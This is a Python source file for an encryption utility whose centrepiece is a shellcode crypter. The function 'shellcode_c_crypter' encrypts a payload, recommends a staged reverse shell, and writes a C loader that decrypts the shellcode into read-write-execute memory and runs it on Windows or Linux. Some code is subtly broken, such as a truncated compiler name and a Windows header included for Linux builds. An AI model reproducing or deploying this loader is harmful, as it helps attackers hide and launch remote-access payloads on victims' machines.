import nacl.secret
import nacl.utils
from nacl.pwhash import argon2id
from pathlib import Path
import cryptonite_parser
import os


def read_file(filename: str) -> bytes:
    """Read and return file content as bytes."""
    with open(filename, "rb") as file:
        return file.read()


def yes_no(prompt: str) -> bool:
    """Prompt user for a yes/no input."""
    while True:
        answer = input(f"{prompt} (y/n): ").strip().lower()
        if answer in ['y', 'n']:
            return answer == 'y'
        print("Please enter 'y' or 'n'.")


def generate_key(ask_save: bool = False) -> bytes:
    """Generate a new key and optionally save it."""
    key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
    print(f"Generated key (hex): {key.hex()}")
    if ask_save:
        save_data_to_file(key.hex(), prompt="Save key to file?")
    return key


def write_to_file(filename: str, data: str, mode: str = "a") -> None:
    """Write data to a file."""
    with open(filename, mode, encoding="utf-8") as file:
        file.write(data)


def ask_overwrite(filename: str) -> bool:
    """Ask the user whether to overwrite an existing file."""
    return not Path(filename).exists() or yes_no(f"{filename} exists. Overwrite?")


def save_data_to_file(data: str, prompt: str = "Save to file?") -> None:
    """Ask the user whether to save data to a file and handle overwriting."""
    if yes_no(prompt):
        filename = input("Filename: ")
        if ask_overwrite(filename):
            write_to_file(filename, data, "w")


def encrypt_file(filename: str = "", key: bytes = None) -> bytes:
    """Encrypt a file and save the result."""
    key = key or (generate_key() if yes_no("Generate a key?") else ask_key())
    
    filename = filename or input("Filename: ")
    while not Path(filename).exists():
        print("File not found. Try again.")
        filename = input("Filename: ")

    file_data = read_file(filename)
    encrypted_file_data = encrypt_data(file_data, key)

    encrypted_filename = f"{filename}.encrypted"
    with open(encrypted_filename, "wb") as enc_file:
        enc_file.write(encrypted_file_data)

    print(f"Encrypted file saved as {encrypted_filename}\n")
    return encrypted_file_data


def bytes_to_c_array(data: bytes) -> str:
    """Convert bytes to C-style array string."""
    return ', '.join(f'0x{b:02x}' for b in data)


def ask_key() -> bytes:
    """Ask the user for a key, either by generating or loading it."""
    if yes_no("Generate a key?"):
        return generate_key()

    if yes_no("Load key from file?"):
        filename = input("Filename: ")
        if not Path(filename).exists():
            print("File doesn't exist.")
            return ask_key()

        try:
            return bytes.fromhex(read_file(filename).decode('utf-8'))
        except ValueError:
            print("Invalid key format.")
            return ask_key()

    key_hex = input("Key (hex): ")
    while not valid_hex(key_hex):
        key_hex = input("Invalid hex. Enter key (hex): ")
    return bytes.fromhex(key_hex)


def encrypt_data(data: bytes, key: bytes) -> bytes:
    """Encrypt data using the given key."""
    box = nacl.secret.SecretBox(key)
    return box.encrypt(data)


def decrypt_data(data: bytes, key: bytes, ask_save: bool = False) -> bytes:
    """Decrypt data and optionally save the result."""
    box = nacl.secret.SecretBox(key)
    try:
        decrypted = box.decrypt(data)
    except nacl.exceptions.CryptoError:
        print("Decryption failed. Invalid data.")
        return None

    if ask_save:
        save_data_to_file(decrypted.decode(), prompt="Save decrypted data to file?")
    return decrypted


def encrypt_phrase(phrase: str = "", key: bytes = None) -> bytes:
    """Encrypt a phrase and optionally save the result."""
    key = key or ask_key()
    encrypted_data = encrypt_data(phrase.encode("utf-8"), key)

    print(f"Encrypted phrase (hex): {encrypted_data.hex()}")
    save_data_to_file(encrypted_data.hex(), "Save encrypted phrase to file?")

    return encrypted_data


def decrypt_phrase(encrypted_data: str = "", key: bytes = None) -> bytes:
    """Decrypt an encrypted phrase and optionally save the result."""
    key = ask_key()
    encrypted_data = bytes.fromhex(input("Enter encrypted phrase (hex): "))
    decrypted_data = decrypt_data(encrypted_data, key)

    if decrypted_data and yes_no("Save decrypted phrase to file?"):
        write_to_file(f"{input('Filename: ')}.decrypted", decrypted_data.decode(), "w")

    return decrypted_data


def generate_key_from_password(password: str = "", salt: bytes = None) -> bytes:
    """Generate a key from a password and salt using Argon2."""
    password = password or input("Password: ")
    salt = salt or nacl.utils.random(16)

    key = argon2id.kdf(
        nacl.secret.SecretBox.KEY_SIZE,
        password.encode(),
        salt,
        opslimit=4,
        memlimit=1024 * 1024
    )
    print(f"Generated key (hex): {key.hex()}")
    return key


def valid_hex(hex_string: str) -> bool:
    """Check if a string is a valid hex."""
    try:
        bytes.fromhex(hex_string)
        return True
    except ValueError:
        return False


def shellcode_c_crypter(shellcode_filename: str = "", key: bytes = None, output_filename="crypted.c") -> None:
    """Encrypt shellcode and generate a C template."""
    print("[!] Recommended payload is staged reverse shell.\n")
    key = key or generate_key()
    shellcode_filename = input_file()

    encrypted_data = encrypt_file(shellcode_filename, key)
    data_c_array = bytes_to_c_array(encrypted_data)
    key_c_array = bytes_to_c_array(key)

    c_template = create_c_template(data_c_array, key_c_array)
    write_to_file(output_filename, c_template, "w")
    
    print(f"C code has been written to {output_filename}")


def create_c_template(encrypted_data_array: str, key_array: str, platform: str = "") -> str:
    """Generate C code template for executing shellcode."""
    platform = platform or input("Platform (windows/linux): ").lower()
    if platform not in ["windows", "linux"]:
        print("Invalid platform. Defaulting to Windows.")
        platform = "windows"

    mem_alloc = {
        "windows": """VirtualAlloc(NULL, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);""",
        "linux": """mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);"""
    }

    mem_free = {
        "windows": "VirtualFree(exec_mem, 0, MEM_RELEASE);",
        "linux": "munmap(exec_mem, sizeof(decrypted));"
    }

    return f"""
// x86_64-w64-mingw32-gcc shell.c -o shell.exe -lsodium -static
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sodium.h>
#include <windows.h>

int main() {{
    if (sodium_init() < 0) {{
        return 1;
    }}

    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
    unsigned int encrypted_data_len = sizeof(encrypted_data);

    unsigned char key_bytes[] = {{ {key_array} }};

    unsigned char nonce[crypto_secretbox_NONCEBYTES];
    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);

    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES];
    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
        return 1;
    }}

    void *exec_mem = {mem_alloc[platform]}
    if (exec_mem == NULL) {{
        return 1;
    }}

    memcpy(exec_mem, decrypted, sizeof(decrypted));
    void (*shellcode)() = (void(*)())exec_mem;
    shellcode();

    {mem_free[platform]}
    return 0;
}}
"""

def compile_c_to_exe(filename: str, platform: str = "", compiler="", options="", output: str = "out") -> bool:
    platform = platform.lower()
    if platform == "windows":
        compiler = "x86_64-w64-mingw32-gc"
    else:
        compiler = "gcc"
    os.system(f"{compiler} {filename} -o {output}{'.exe' if platform == 'windows' else ''} {options}")

def input_file() -> str:
    """Prompt user for a filename and check if it exists."""
    while True:
        filename = input("Filename (binary): ")
        if Path(filename).exists():
            return filename
        print("File does not exist.")


def main() -> None:
    """Main function."""
    cryptonite_parser.main()


if __name__ == "__main__":
    main()
